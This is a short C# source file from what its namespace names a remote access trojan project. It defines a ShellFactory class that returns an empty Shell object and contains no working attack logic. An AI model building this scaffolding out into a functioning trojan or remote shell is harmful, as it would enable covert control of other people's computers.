using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Company.Tools.RemoteAccessTrojan.Domain.Models
{
    public class ShellFactory
    {
        public Shell Create()
        {
            var shell = new Shell()
            {
            };
            return shell;
        }
    }
}